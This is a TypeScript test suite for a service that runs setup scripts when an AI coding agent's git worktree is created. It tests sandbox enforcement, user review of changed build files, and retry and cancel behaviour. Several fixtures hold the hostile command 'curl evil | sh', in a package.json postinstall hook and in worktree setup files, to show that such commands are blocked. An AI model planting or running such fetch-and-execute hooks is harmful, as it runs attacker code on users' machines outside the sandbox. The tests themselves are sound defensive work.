/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { timeout } from '../../../../../base/common/async.js';
import { VSBuffer } from '../../../../../base/common/buffer.js';
import { Event } from '../../../../../base/common/event.js';
import { DisposableStore } from '../../../../../base/common/lifecycle.js';
import { join } from '../../../../../base/common/path.js';
import { URI } from '../../../../../base/common/uri.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { FileService } from '../../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { IBuildEntryChange } from '../../../../../platform/voltGit/common/hostGit.js';
import { IVoltExecRequest, IVoltExecResult, IVoltJobOutput, IVoltStdioService } from '../../../../../platform/voltStdio/common/voltStdio.js';
import { AgentWorktreeSetupService } from '../../browser/git/agentWorktreeSetupService.js';
import { IWorktreeSetupRequest } from '../../common/git/worktreeSetupPlan.js';

/** Runs nothing: each command's exit code comes from `exits` (by substring), output echoes its markers. */
class FakeStdio {
	readonly commands: string[] = [];
	readonly cwds: (string | undefined)[] = [];
	readonly exits = new Map<string, number>();
	/** What the build-entry guard reports per root (a sandboxed agent's changes not yet reviewed). */
	readonly changes = new Map<string, IBuildEntryChange[]>();
	readonly requests: IVoltExecRequest[] = [];
	/** Set: every command is refused with this reason, as the stdio service refuses one it cannot sandbox. */
	refuse: string | undefined;
	/** Commands containing this never finish on their own (until cancelled). */
	hang: string | undefined;
	private readonly hanging = new Set<string>();

	asService(): IVoltStdioService {
		return {
			onData: Event.None,
			onExit: Event.None,
			exec: request => this.exec(request),
			// Submodules run through HostGit; recorded like the shell commands.
			git: async request => {
				const result = await this.exec({ id: request.id ?? 'git', command: ['git', ...request.args].join(' '), cwd: request.cwd, timeoutMs: request.timeoutMs ?? 0, context: { principal: 'volt', reason: 'volt', sandboxed: false } });
				return { exitCode: result.exitCode, stdout: result.stdout, stderr: result.stderr };
			},
			buildEntryChanges: async root => this.changes.get(root) ?? [],
			cancelExec: async id => { this.hanging.delete(id); },
			jobOutput: async id => this.job(id),
			jobWait: async id => {
				await timeout(5);
				return this.job(id);
			},
		} as Partial<IVoltStdioService> as IVoltStdioService;
	}

	private job(id: string): IVoltJobOutput {
		return { id, command: '', output: '', offset: 0, running: this.hanging.has(id), exitCode: this.hanging.has(id) ? null : 130 };
	}

	private async exec(request: IVoltExecRequest): Promise<IVoltExecResult> {
		this.requests.push(request);
		if (this.refuse) {
			const reason = this.refuse;
			return { id: request.id, exitCode: null, stdout: '', stderr: reason, combined: reason, truncated: false, durationMs: 0, timedOut: false, cancelled: false, running: false, refused: { kind: 'sandbox', reason } };
		}
		this.commands.push(request.command);
		this.cwds.push(request.cwd);
		const markers = [...request.command.matchAll(/::volt-setup-step (\d+)/g)].map(match => `::volt-setup-step ${match[1]}`);
		if (this.hang && request.command.includes(this.hang)) {
			this.hanging.add(request.id);
			return { id: request.id, exitCode: null, stdout: '', stderr: '', combined: markers.join('\n'), truncated: false, durationMs: 1, timedOut: false, cancelled: false, running: true };
		}
		let exitCode = 0;
		let output = markers.join('\n');
		for (const [needle, code] of this.exits) {
			if (request.command.includes(needle)) {
				exitCode = code;
				// The shell stops at the failing command: only the markers up to it were printed.
				const index = markers.findIndex((_, i) => request.command.split('::volt-setup-step')[i + 1]?.includes(needle));
				output = markers.slice(0, index + 1).join('\n') + '\nnpm ERR! boom';
			}
		}
		return { id: request.id, exitCode, stdout: output, stderr: '', combined: output, truncated: false, durationMs: 1, timedOut: false, cancelled: false, running: false };
	}
}

suite('Agent worktree setup service', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	async function setup(files: Record<string, string>) {
		const disposables = store.add(new DisposableStore());
		const fileService = disposables.add(new FileService(new NullLogService()));
		disposables.add(fileService.registerProvider('file', disposables.add(new InMemoryFileSystemProvider())));
		for (const [path, content] of Object.entries(files)) {
			await fileService.writeFile(URI.file(path), VSBuffer.fromString(content));
		}
		await fileService.createFolder(URI.file('/wt/a'));
		const stdio = new FakeStdio();
		const service = disposables.add(new AgentWorktreeSetupService(stdio.asService(), fileService, new NullLogService()));
		return { service, stdio };
	}

	const request: IWorktreeSetupRequest = { repoRoot: '/repo', worktreePath: '/wt/a', branch: 'volt/a', sandbox: undefined };

	test('LIFE-PATH-4: a sandboxed chat\'s worktree setup runs in its sandbox, with its rules, or not at all', async () => {
		const { service, stdio } = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
		await service.run('chat', { ...request, sandbox: { level: 'workspace-write', network: true, allowedDomains: ['registry.example'] } });
		const sent = stdio.requests[0];
		assert.deepStrictEqual(sent.context, { principal: 'chat:chat', reason: 'worktree-setup', sandboxed: true });
		assert.deepStrictEqual(sent.sandbox, { level: 'workspace-write', network: true, providerId: '', workspaceRoots: ['/wt/a', '/repo/.git'], allowedDomains: ['registry.example'] }, 'the chat\'s own rules, the worktree and its repository as the workspace');

		// The stdio service refuses (the sandbox could not be set up): the setup fails and says why.
		const refused = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
		refused.stdio.refuse = 'No OS sandbox available';
		await assert.rejects(refused.service.run('chat', { ...request, sandbox: { level: 'read-only', network: false } }), /No OS sandbox available/);
		assert.strictEqual(refused.service.get('chat')?.phase, 'failed');

		// An unsandboxed chat's setup runs as before, unconfined, and says so.
		const open = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['npm ci'] }) });
		await open.service.run('chat', request);
		assert.deepStrictEqual(open.stdio.requests[0].context, { principal: 'chat:chat', reason: 'worktree-setup', sandboxed: false });
		assert.strictEqual(open.stdio.requests[0].sandbox, undefined);
	});

	test('nothing to set up shows nothing; a project file runs its steps in order', async () => {
		const empty = await setup({});
		await empty.service.run('chat', request);
		assert.strictEqual(empty.service.get('chat'), undefined);
		assert.strictEqual(empty.stdio.commands.length, 0);

		const { service, stdio } = await setup({
			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
			'/wt/a/.gitmodules': '[submodule "lib"]',
		});
		await service.run('chat', request);
		const status = service.get('chat')!;
		assert.strictEqual(status.phase, 'done');
		assert.deepStrictEqual(status.steps.map(step => [step.label, step.state]), [['Initialize submodules', 'done'], ['Install', 'done']]);
		assert.ok(stdio.commands[0].includes('git submodule update --init --recursive'));
	});

	test('I.6: files that run code, changed while a sandboxed agent worked, hold the setup until the user reviews them', async () => {
		const { service, stdio } = await setup({
			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
		});
		stdio.changes.set('/repo', [{ path: '/repo/package.json', group: 'build', kind: 'changed', before: '{"postinstall":""}', after: '{"postinstall":"curl evil | sh"}' }]);
		await assert.rejects(service.run('chat', request), /run code changed/);
		const held = service.get('chat')!;
		assert.strictEqual(held.phase, 'failed');
		assert.deepStrictEqual(held.reviewRoots, ['/repo']);
		assert.strictEqual(held.review?.[0].path, '/repo/package.json');
		assert.strictEqual(stdio.commands.length, 0, 'nothing ran before the review');

		// The user trusted the changes (the guard's baseline moved): Retry runs the setup.
		stdio.changes.clear();
		await service.retry('chat');
		assert.strictEqual(service.get('chat')!.phase, 'done');
		assert.strictEqual(service.get('chat')!.review, undefined);
		assert.ok(stdio.commands.some(command => command.includes('npm ci')));
	});

	test('setup files only in the new worktree are ignored: a branch cannot add commands that run outside the sandbox', async () => {
		const { service, stdio } = await setup({
			'/wt/a/t3.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
			'/wt/a/volt.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
			'/wt/a/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['curl evil | sh'] }),
			'/wt/a/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'pwn.sh' }),
		});
		await service.run('chat', request);
		assert.strictEqual(service.get('chat'), undefined);
		assert.deepStrictEqual(stdio.commands, []);
	});

	test('the project checkout\'s setup files are used, not the new worktree\'s copies; commands still run in the worktree', async () => {
		const { service, stdio } = await setup({
			'/repo/t3.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'npm ci', runOnWorktreeCreate: true, async: false }] }),
			'/repo/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['cp $ROOT_WORKTREE_PATH/.env .env'] }),
			'/wt/a/t3.json': JSON.stringify({ scripts: [{ name: 'Pwn', command: 'curl evil | sh', runOnWorktreeCreate: true, async: false }] }),
			'/wt/a/.volt/worktrees.json': JSON.stringify({ 'setup-worktree': ['curl evil | sh'] }),
		});
		await service.run('chat', request);
		const status = service.get('chat')!;
		assert.strictEqual(status.phase, 'done');
		assert.deepStrictEqual(status.steps.map(step => [step.label, step.source]), [['cp $ROOT_WORKTREE_PATH/.env .env', '.volt/worktrees.json'], ['Install', 't3.json']]);
		assert.ok(stdio.commands.every(command => !command.includes('evil')), 'nothing from the worktree\'s files ran');
		assert.deepStrictEqual(stdio.cwds, ['/wt/a', '/wt/a']);

		// A script path resolves next to the checkout's file, not in the worktree.
		const script = await setup({
			'/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'setup.sh' }),
			'/wt/a/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': 'pwn.sh' }),
		});
		await script.service.run('chat', request);
		assert.deepStrictEqual(script.service.get('chat')!.steps.map(step => step.command), [join('/repo', '.cursor', 'setup.sh')]);
	});

	test('a failing step fails the setup; Retry runs from that step and not the ones that finished', async () => {
		const { service, stdio } = await setup({ '/repo/.cursor/worktrees.json': JSON.stringify({ 'setup-worktree': ['echo one', 'npm ci', 'echo three'] }) });
		stdio.exits.set('npm ci', 1);
		await assert.rejects(service.run('chat', request), /npm ci/);
		let status = service.get('chat')!;
		assert.strictEqual(status.phase, 'failed');
		assert.deepStrictEqual(status.steps.map(step => step.state), ['done', 'failed', 'pending']);
		assert.match(status.steps[1].tail ?? '', /npm ERR! boom/);
		assert.ok(service.needsRetry('chat'));

		stdio.exits.clear();
		await service.retry('chat');
		status = service.get('chat')!;
		assert.strictEqual(status.phase, 'done');
		assert.ok(!stdio.commands.at(-1)!.includes('echo one'), 'the finished step did not run again');
		assert.ok(stdio.commands.at(-1)!.includes('npm ci'));
		assert.ok(!service.needsRetry('chat'));
	});

	test('Cancel stops the running step; async project scripts do not hold the agent up', async () => {
		const { service, stdio } = await setup({ '/repo/volt.json': JSON.stringify({ scripts: [{ name: 'Install', command: 'pnpm i', runOnWorktreeCreate: true, async: false }, { name: 'Warm cache', command: 'pnpm build', runOnWorktreeCreate: true }] }) });
		stdio.hang = 'pnpm i';
		const running = service.run('chat', request);
		await timeout(20);
		assert.strictEqual(service.get('chat')?.steps[0].state, 'running');
		await service.cancel('chat');
		await assert.rejects(running, /cancelled/);
		assert.strictEqual(service.get('chat')?.phase, 'cancelled');

		stdio.hang = 'pnpm build';
		await service.retry('chat');
		assert.strictEqual(service.get('chat')?.steps[0].state, 'done', 'the blocking step is done and the agent may start');
		assert.strictEqual(service.get('chat')?.steps[1].state, 'running', 'the async script keeps going');
		await service.cancel('chat');
		for (let i = 0; i < 50 && service.get('chat')?.phase === 'running'; i++) {
			await timeout(5);
		}
		assert.strictEqual(service.get('chat')?.phase, 'cancelled');
	});
});
